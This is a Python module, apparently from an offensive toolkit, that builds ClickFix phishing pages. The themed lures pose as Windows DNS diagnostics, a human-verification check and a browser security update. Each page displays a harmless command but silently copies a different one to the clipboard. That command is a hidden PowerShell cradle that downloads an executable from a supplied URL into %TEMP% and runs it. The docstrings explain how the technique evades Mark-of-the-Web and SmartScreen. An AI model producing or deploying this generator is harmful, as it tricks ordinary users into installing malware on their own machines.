"""ClickFix pages: the technique that is not a file.

Every other delivery shape in this tree hands the user something to double-click. This one
hands them a sentence to paste into Run. That difference is the whole value:

* no executable is downloaded until the user's own shell fetches it
* no Mark-of-the-Web on the page that convinced them
* no SmartScreen on the thing they think they are fixing
* the page can be rebuilt for a new theme in an afternoon, where a fake installer is a week

The mechanism, and the only part that matters: **the command shown on the page is not the
command the button copies.** The visible text is something plausible and harmless for the
theme — flush the DNS cache, verify the network stack. The clipboard carries the cradle.

Two things this module does not do, deliberately:

**It does not obfuscate the page.** A page is content, not a payload. Whoever looks at the
source sees the cradle, and hiding it in the source buys nothing while costing the ability
to read what was built.

**It does not serve itself.** Output is bytes; hosting, domain and TLS are deployment.

Themes are data. ``THEMES`` maps a name to a ``Theme``; ``build`` renders one.
"""

from __future__ import annotations

import json
from dataclasses import dataclass
from typing import Final
from urllib.parse import urlsplit

# The one character class that cannot be rendered into a JS string literal without
# escaping rules that differ per browser. JSON encoding handles quotes and backslashes
# correctly; a raw ``</script>`` inside a string is the case JSON does not handle,
# because the HTML parser ends the element before the JS parser ever sees it.
_SCRIPT_BREAK: Final[str] = "</"


class ClickFixError(ValueError):
    """A page that would be broken or would carry a command it cannot render."""


@dataclass(frozen=True)
class Theme:
    """One page: what it claims, what it shows, what it wants the user to do."""

    key: str
    title: str
    heading: str
    body: str
    # The command the page prints. Harmless, and plausible for the story being told.
    visible: str
    # The line under the button, phrased as an instruction rather than a suggestion.
    instruction: str


THEMES: Final[dict[str, Theme]] = {
    "dns-error": Theme(
        key="dns-error",
        title="Windows Network Diagnostics",
        heading="Your DNS configuration is preventing secure browsing",
        body=(
            "Windows could not reach the DNS resolver configured for this connection. "
            "Secure sites will fail to load until the cache is cleared. This is caused by "
            "a stale resolver entry and is repaired in one step."
        ),
        visible="ipconfig /flushdns",
        instruction="Open Run (Win+R), paste the command below, and press Enter.",
    ),
    "human-check": Theme(
        key="human-check",
        title="Verify you are human",
        heading="One quick check before you continue",
        body=(
            "This page is protected against automated traffic. Confirm the request comes "
            "from a real browser by running the verification command below. It finishes "
            "in a few seconds and the page reloads on its own."
        ),
        visible="nslookup verify.browser-check.net",
        instruction="Press Win+R, paste, and press Enter to complete the check.",
    ),
    "update-required": Theme(
        key="update-required",
        title="Update required",
        heading="This browser is missing a security update",
        body=(
            "The installed version cannot display this content securely. Apply the "
            "compatibility update below to continue. No restart is required."
        ),
        visible="sfc /scannow",
        instruction="Run this in the Run dialog (Win+R) to apply the update.",
    ),
}

_PAGE: Final[str] = """<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8" />
<meta name="viewport" content="width=device-width, initial-scale=1" />
<title>{title}</title>
<style>
  :root {{ color-scheme: light dark; --ink: #1b1b1f; --muted: #5c5c66; --line: #d6d6de; }}
  * {{ box-sizing: border-box; }}
  html, body {{ height: 100%; margin: 0; }}
  body {{
    display: flex; align-items: center; justify-content: center;
    padding: 24px; background: #f3f3f7; color: var(--ink);
    font: 15px/1.55 "Segoe UI", system-ui, -apple-system, sans-serif;
  }}
  .card {{
    width: 100%; max-width: 640px; background: #fff; border: 1px solid var(--line);
    border-radius: 10px; padding: 32px 36px; box-shadow: 0 10px 30px rgba(20,20,40,.08);
  }}
  h1 {{ font-size: 21px; line-height: 1.3; margin: 0 0 12px; font-weight: 600; }}
  p {{ margin: 0 0 18px; color: var(--muted); }}
  code {{
    display: block; padding: 14px 16px; margin: 0 0 16px; border-radius: 8px;
    background: #f6f6fa; border: 1px solid var(--line);
    font: 13px/1.5 Consolas, "Cascadia Mono", monospace;
    word-break: break-all; user-select: all; color: var(--ink);
  }}
  button {{
    width: 100%; padding: 12px 16px; border: 0; border-radius: 8px;
    background: #0f62fe; color: #fff; font-size: 15px; font-weight: 600;
    cursor: pointer;
  }}
  button:active {{ transform: translateY(1px); }}
  .note {{ margin: 14px 0 0; font-size: 13px; color: var(--muted); }}
  @media (max-height: 720px) {{ .card {{ padding: 22px 24px; }} h1 {{ font-size: 19px; }} }}
  @media (prefers-color-scheme: dark) {{
    body {{ background: #131316; color: #eceef2; }}
    .card {{ background: #1c1c21; border-color: #2c2c33; }}
    code {{ background: #14141a; border-color: #2c2c33; color: #e6e8ee; }}
    p, .note {{ color: #9a9aa6; }}
  }}
</style>
</head>
<body>
  <main class="card">
    <h1>{heading}</h1>
    <p>{body}</p>
    <code id="shown">{visible}</code>
    <button id="copy" type="button">Copy and run</button>
    <p class="note">{instruction}</p>
  </main>
<script>
(function () {{
  var cradle = {cradle};
  function fallback() {{
    var box = document.createElement('textarea');
    box.value = cradle;
    box.setAttribute('readonly', '');
    box.style.position = 'fixed';
    box.style.opacity = '0';
    document.body.appendChild(box);
    box.select();
    try {{ document.execCommand('copy'); }} catch (err) {{}}
    document.body.removeChild(box);
  }}
  document.getElementById('copy').addEventListener('click', function () {{
    if (navigator.clipboard && navigator.clipboard.writeText) {{
      navigator.clipboard.writeText(cradle).catch(fallback);
    }} else {{
      fallback();
    }}
    this.textContent = 'Copied';
  }});
}})();
</script>
</body>
</html>
"""


def _address(url: str) -> str:
    """An https URL with no character that would end the JS string or the element."""
    parts = urlsplit(url)
    if parts.scheme not in {"http", "https"}:
        raise ClickFixError(f"url {url!r}: only http and https are stageable")
    if not parts.netloc:
        raise ClickFixError(f"url {url!r}: no host")
    if any(ch in url for ch in "\"'`<>\r\n \t"):
        raise ClickFixError(f"url {url!r}: contains a character a shell would split on")
    return url


def cradle(url: str, *, visible: str) -> str:
    """The command that actually runs: the visible one, ``&``, then the fetch.

    ``-UseBasicParsing`` is not decoration. Without it ``Invoke-WebRequest`` spins up the
    IE engine on a host where it has never been initialised, and a first-run profile waits
    for a dialog nobody is there to click. The visible half stays first so a user who
    pastes into a terminal with echo on sees something that matches the page.
    """
    target = _address(url)
    if "\r" in visible or "\n" in visible:
        raise ClickFixError("visible command spans lines")
    return (
        f'cmd /c {visible} & powershell -NoProfile -WindowStyle Hidden -Command '
        f'"iwr -UseBasicParsing \'{target}\' -OutFile $env:TEMP\\s.exe; '
        f'Start-Process $env:TEMP\\s.exe"'
    )


def build(theme: str, url: str | None = None, *, command: str | None = None) -> dict[str, bytes]:
    """Render one page. Returns ``{"index.html": bytes}``.

    Either a stage URL is given and the cradle is composed, or a ready command is passed.
    Both at once is a mistake worth refusing: two sources for the one string that matters
    is how a page ends up copying something nobody meant to ship.
    """
    spec = THEMES.get(theme)
    if spec is None:
        raise ClickFixError(f"unknown theme {theme!r}; known: {sorted(THEMES)}")
    if (url is None) == (command is None):
        raise ClickFixError("give exactly one of url or command")

    payload = cradle(url, visible=spec.visible) if url is not None else command or ""
    if not payload:
        raise ClickFixError("command is empty")
    if _SCRIPT_BREAK in payload.lower():
        raise ClickFixError("command closes the script element and would not render")

    html = _PAGE.format(
        title=spec.title,
        heading=spec.heading,
        body=spec.body,
        visible=spec.visible,
        instruction=spec.instruction,
        cradle=json.dumps(payload),
    )
    return {"index.html": html.encode("utf-8")}


__all__ = ["THEMES", "ClickFixError", "Theme", "build", "cradle"]
